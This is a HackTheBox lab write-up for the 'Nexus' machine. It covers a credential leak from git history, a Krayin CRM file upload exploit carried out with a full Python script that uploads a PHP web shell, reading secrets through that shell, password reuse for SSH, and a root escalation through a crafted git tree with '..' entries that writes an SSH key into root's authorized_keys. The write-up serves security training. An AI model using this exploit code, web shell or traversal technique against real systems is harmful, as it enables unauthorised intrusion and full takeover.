# Nexus – HackTheBox Writeup

**Target:** Nexus (10.129.234.54)
**Attacker:** Kali Linux
**OS:** Linux (Ubuntu 24.04)
**Difficulty:** Easy
**Attack Path:** Git History Credential Leak → Krayin CRM File Upload RCE → Password Reuse → Git Tree Path Traversal → Root

---

## Recon

### Port Scan

```bash
nmap -p- --min-rate 3000 -T4 10.129.234.54
nmap -p22,80 -sC -sV 10.129.234.54
```

Just two ports. SSH on 22 and nginx on 80. The web server immediately redirects to `nexus.htb` which tells us it's doing virtual host routing. Added it to /etc/hosts:

```bash
echo "10.129.234.54 nexus.htb" | sudo tee -a /etc/hosts
```

The website is some "Nexus Energy Authority" page. Nothing interesting on the surface, just corporate filler with a mention of a "grid data portal".

### Subdomain Discovery

Since we know it's vhost-based, there are probably more subdomains hiding behind the same IP:

```bash
gobuster vhost -u http://10.129.234.54 --domain nexus.htb --append-domain \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
```

Found `git.nexus.htb`. Hit it in the browser and it's running Gitea 1.26.0. Confirmed the version with the API:

```bash
curl http://git.nexus.htb/api/v1/version
```

Later I also found `billing.nexus.htb` from reading the repo contents, which turned out to be running Krayin CRM 2.2.0. Added both to /etc/hosts.

---

## Credentials From Git History

Gitea had a public repo called `admin/krayin-docker-setup`. Public repos are always worth digging through, but the important thing here is to check the entire commit history, not just the current files. Developers add secrets, realize their mistake, remove them in a later commit, and think the problem is solved. It's not. Git remembers everything.

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup krayin
git -C krayin log -p --all | grep -iE 'password|secret|key'
```

`log -p` shows the full diff for every commit and `--all` includes all branches. Then grep pulls out anything interesting. Found exactly what I was hoping for:

```diff
-DB_PASSWORD=N27xh!!2ucY04
+DB_PASSWORD=
```

Someone committed the database password, then removed it in a later commit. But the old commit still has it. The `.env` file in the repo also revealed the app is Krayin CRM running at `billing.nexus.htb`.

---

## Getting a Shell

### Logging Into Krayin

Opened `billing.nexus.htb` and got a Krayin CRM login page at `/admin/login`. The main Nexus website mentioned an employee name, and the leaked password from the git history worked:

```
j.matthew@nexus.htb : N27xh!!2ucY04
```

Dashboard confirmed the version: Krayin CRM 2.2.0. Googled `krayin CRM 2.2.0 CVE` and found CVE-2026-38526.

### Unrestricted File Upload (CVE-2026-38526)

The TinyMCE rich text editor in Krayin has an upload endpoint at `/admin/tinymce/upload` that doesn't validate file types or extensions at all. You can upload a `.php` file, it lands in `/storage/tinymce/` with an MD5 hash as the filename, and the web server happily executes it. That's a textbook unrestricted file upload.

The exploit needs to handle Laravel's CSRF protection. Laravel uses two layers: a `_token` field in the form and an `X-XSRF-TOKEN` header derived from the `XSRF-TOKEN` cookie. You need both to make authenticated requests.

Wrote a Python script to automate the whole thing:

```python
import requests, urllib.parse, re, socket

# DNS hack so requests resolves nexus.htb hostnames to the target IP
_real = socket.getaddrinfo
socket.getaddrinfo = lambda h,*a,**k: _real(
    "10.129.234.54" if h.endswith("nexus.htb") else h, *a, **k)

IP, HOST = "http://billing.nexus.htb", "billing.nexus.htb"
U, P = "j.matthew@nexus.htb", "N27xh!!2ucY04"

s = requests.Session()
r = s.get(f"{IP}/admin/login")
tok = re.search(r'name="_token"\s+value="([^"]+)"', r.text).group(1)
xsrf = urllib.parse.unquote(s.cookies.get("XSRF-TOKEN"))

s.post(f"{IP}/admin/login",
    json={"_token": tok, "email": U, "password": P},
    headers={"X-XSRF-TOKEN": xsrf, "Referer": f"http://{HOST}/admin/login",
             "Accept": "application/json", "X-Requested-With": "XMLHttpRequest"})

xsrf = urllib.parse.unquote(s.cookies.get("XSRF-TOKEN"))
shell = b"<?php if(isset($_GET['cmd'])){echo '<pre>';system($_GET['cmd']);echo '</pre>';} ?>"
r = s.post(f"{IP}/admin/tinymce/upload",
    files={"file": ("sh.php", shell, "image/jpeg")},
    headers={"X-XSRF-TOKEN": xsrf})
print(r.json()["location"])
```

The `socket.getaddrinfo` monkeypatch at the top is a trick for when you can't edit /etc/hosts. It intercepts DNS resolution and points anything ending in `nexus.htb` straight at the target IP. The upload spoofs the Content-Type as `image/jpeg` but keeps the `.php` extension. The server doesn't check either one properly so it doesn't matter.

The response gives back the full URL to the uploaded shell. Tested it:

```bash
curl "http://billing.nexus.htb/storage/tinymce/<md5>.php?cmd=id;hostname"
# uid=33(www-data) ... nexus
```

We're `www-data`. Worth noting that even though the git repo had a Docker Compose file for Krayin, the app is actually running directly on the host. The hostname came back as `nexus`, not some random container hash, and real users like `jones` and `git` exist on the system.

---

## User Access

The `.env` file in the git repo had the password blanked out, but the real `.env` on the server still has the actual database password:

```bash
curl "http://billing.nexus.htb/storage/tinymce/<md5>.php?cmd=grep+DB_+/var/www/krayin/.env"
```

```
DB_PASSWORD=y27xb3ha!!74GbR
```

This is a different password than the one from the git history. Tried it for SSH and password reuse paid off:

```bash
ssh jones@10.129.234.54
# Password: y27xb3ha!!74GbR
```

We're in as `jones`. User flag grabbed:

```bash
cat ~/user.txt
```

I did check the Krayin database for user hashes too but it only had one bcrypt hash for a `james` account. The `.env` password reuse was way faster than trying to crack bcrypt.

---

## Privilege Escalation

### Enumeration

```bash
sudo -l
# Password required, no rules anyway

id
# uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)
```

No sudo, no interesting groups, no weird SUID binaries, no capabilities. The kernel was 6.8.0 from March 2026 so nothing recent to exploit there either.

Checked what's listening internally:

```bash
ss -ltnp
```

Port 3000 on localhost. Looked at the running processes and it's Gitea running as the `git` user with its config at `/etc/gitea/app.ini`. Same Gitea we saw from outside, just also accessible internally.

The interesting discovery was a directory at `/home/git/template-staging/` and a log file at `/var/log/template-sync.log`. Those names together tell a story.

### Understanding the template-sync Mechanism

There's a systemd timer that fires about every minute. It looks through Gitea for any repos marked as a "template", then syncs their files into `/home/git/template-staging/<owner>/<repo>/`. The critical detail: this sync runs as root and it doesn't sanitize file paths.

That means if you can get a file with `..` in its path into a template repo, the sync process will follow those traversals and write the file wherever you want on the filesystem. Since it runs as root, it can write anywhere.

The target path is `/root/.ssh/authorized_keys`. From the staging directory at `/home/git/template-staging/jones/rce/`, you need enough `../` to climb back to the filesystem root and then go down into `/root/.ssh/`.

### Building the Payload

Git normally won't let you create files with `..` in the path. But if you write raw git objects directly instead of using normal git commands, you can build whatever tree structure you want, including illegal ones with `..` directory entries.

First, generated an SSH keypair:

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

Then created a repo through the Gitea API. Jones has a Gitea account with the same password because of course he does:

```bash
curl -u 'jones:y27xb3ha!!74GbR' \
  -X POST http://git.nexus.htb/api/v1/user/repos \
  -H "Content-Type: application/json" -d '{"name":"rce","auto_init":false}'
```

The Python script below builds the malicious git tree. It writes raw git objects (blobs, trees, and a commit) directly into `.git/objects`. The tree structure it creates has a `..` entry at the root level that chains through multiple parent directory traversals until it reaches `/root/.ssh/authorized_keys` containing our public key:

```python
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, time

def write_obj(data, t):
    s = ("%s %d" % (t, len(data))).encode() + b"\x00" + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2]); os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p): open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

key = subprocess.run(["cat", "/tmp/.k.pub"], capture_output=True, text=True).stdout.strip() + "\n"
blob   = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")
ssh_t  = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur    = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir    = write_obj(entry("40000", "root", cur), "tree")
for _ in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")
root = write_obj(entry("100644", "README.md", readme) + entry("40000", "..", fir), "tree")
ts = int(time.time())
c = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")
os.makedirs(".git/refs/heads", exist_ok=True)
open(".git/refs/heads/main", "w").write(sha + "\n")
print("Done:", sha)
```

Let me break down what the tree looks like. At the top level the repo has `README.md` (so it looks normal) and a `..` directory entry. That `..` entry contains another `..`, and another, and another, four levels deep. At the bottom of that chain is `root/.ssh/authorized_keys` containing our public key. When the sync process extracts these files starting from `template-staging/jones/rce/`, the `..` entries climb all the way back up to `/` and then the path resolves to `/root/.ssh/authorized_keys`.

Pushed it to Gitea:

```bash
cd /tmp/rce && touch README.md && python3 build.py
git push -f 'http://jones:y27xb3ha%21%2174GbR@git.nexus.htb/jones/rce.git' main
```

Git even warned about the traversal in the push output which confirmed it was working.

Last step is marking the repo as a template so the sync process picks it up:

```bash
curl -u 'jones:y27xb3ha!!74GbR' \
  -X PATCH http://git.nexus.htb/api/v1/repos/jones/rce \
  -H "Content-Type: application/json" -d '{"template":true}'
```

### Root

Waited about a minute for the timer to fire. Checked the sync log:

```
[..] Syncing template: jones/rce
[..]   synced: README.md
[..]   synced: ../../../../../root/.ssh/authorized_keys
[..] Template sync complete
```

There it is. Our key got written to root's authorized_keys.

```bash
ssh -i /tmp/.k root@10.129.234.54
cat /root/root.txt
```

Box pwned.

---

## Attack Chain Summary

```
nmap → Port 22, 80
→ gobuster vhost → git.nexus.htb (Gitea 1.26.0)
→ Public repo admin/krayin-docker-setup
→ git log -p → DB password leaked in old commit (N27xh!!2ucY04)
→ billing.nexus.htb → Krayin CRM 2.2.0
→ Logged in as j.matthew with leaked password
→ CVE-2026-38526 (TinyMCE unrestricted file upload) → webshell as www-data
→ Real .env on server → DB password y27xb3ha!!74GbR
→ Password reuse → SSH as jones → user flag
→ Found template-sync running as root every minute
→ Created Gitea repo with malicious git tree (.. path traversal)
→ Marked repo as template → sync wrote SSH key to /root/.ssh/authorized_keys
→ SSH as root → root flag
```

---

## What I Learned

Git history is a goldmine. The current state of a repo might look clean but `git log -p --all | grep -iE 'password|secret|key'` will find anything that was ever committed and later removed. Developers delete secrets from files but forget that git keeps every version forever. Always clone the repo and search the full history.

Laravel CSRF has two layers and you need to handle both. The `_token` form field and the `X-XSRF-TOKEN` header from the cookie. If your exploit script is getting 419 errors, you're probably missing one of them. The `XSRF-TOKEN` cookie is URL-encoded so you need to decode it before sending it back as a header.

The `socket.getaddrinfo` monkeypatch in Python is super useful when you can't edit /etc/hosts. Instead of fighting with DNS, you just override resolution at the socket level and point hostnames wherever you want. Works with the `requests` library transparently.

Password reuse across services on the same box is still one of the most reliable escalation paths. The DB password from `.env` worked for SSH, and the SSH password also worked for Gitea. Every time you find a credential, try it everywhere.

Git's internal object format can be abused for path traversal. Normal git commands won't let you create tree entries named `..` but if you write raw objects (blob → tree → commit) directly into `.git/objects`, you can build any tree structure you want. When a tool extracts those files without sanitizing paths, the `..` entries escape the intended directory. Any process that checks out or syncs git repos needs to validate paths or it's game over.

When you find a log file for a service you don't recognize, read it. The `/var/log/template-sync.log` file told me exactly what the sync process does, what it looks for (template repos), and where it writes. Without that log I would have spent a lot longer figuring out the escalation path.

Marking a Gitea repo as a template is just a PATCH request to the API with `{"template":true}`. The web UI can do it too but the API is faster when you're already working from a shell.

*Educational purposes only. This is a HackTheBox machine in a controlled lab environment.*
